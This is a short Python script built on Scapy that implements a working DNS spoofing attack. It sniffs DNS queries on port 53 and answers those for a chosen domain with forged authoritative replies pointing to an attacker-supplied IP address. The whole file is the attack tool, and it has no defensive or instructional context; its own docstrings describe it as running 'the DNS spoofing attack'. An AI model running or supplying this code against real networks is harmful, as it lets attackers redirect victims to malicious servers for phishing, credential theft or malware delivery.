from scapy.all import IP, UDP, DNS, DNSRR, sniff, send
from colorama import init, Fore

init(autoreset=True)

class DNSSpoofing:
    def __init__(self, target_domain, fake_ip):
        """Initialize the DNSSpoofing class with a target domain and a fake IP address."""
        self.target_domain = target_domain
        self.fake_ip = fake_ip

    def dns_spoof(self, packet):
        """Intercept and spoof DNS packets."""
        if packet.haslayer(DNS) and packet.getlayer(DNS).qr == 0:
            qname = packet.getlayer(DNS).qd.qname.decode()
            if self.target_domain in qname:
                print(f"{Fore.YELLOW}[INFO] Intercepted DNS request for {qname}. Spoofing response...")

                spoofed_pkt = (
                    IP(dst=packet[IP].src, src=packet[IP].dst) /
                    UDP(dport=packet[UDP].sport, sport=packet[UDP].dport) /
                    DNS(
                        id=packet[DNS].id,
                        qr=1,
                        aa=1,
                        qd=packet[DNS].qd,
                        an=DNSRR(rrname=qname, ttl=10, rdata=self.fake_ip)
                    )
                )

                send(spoofed_pkt, verbose=0)

    def run(self):
        """Run the DNS spoofing attack."""
        print(f"{Fore.CYAN}Starting DNS spoofing for {self.target_domain} to redirect to {self.fake_ip}...{Fore.RESET}")
        print(f"{Fore.YELLOW}[INFO] Spoofing DNS responses. Press Ctrl+C to stop.{Fore.RESET}")

        sniff(filter="udp port 53 or tcp port 53", prn=self.dns_spoof, store=0)
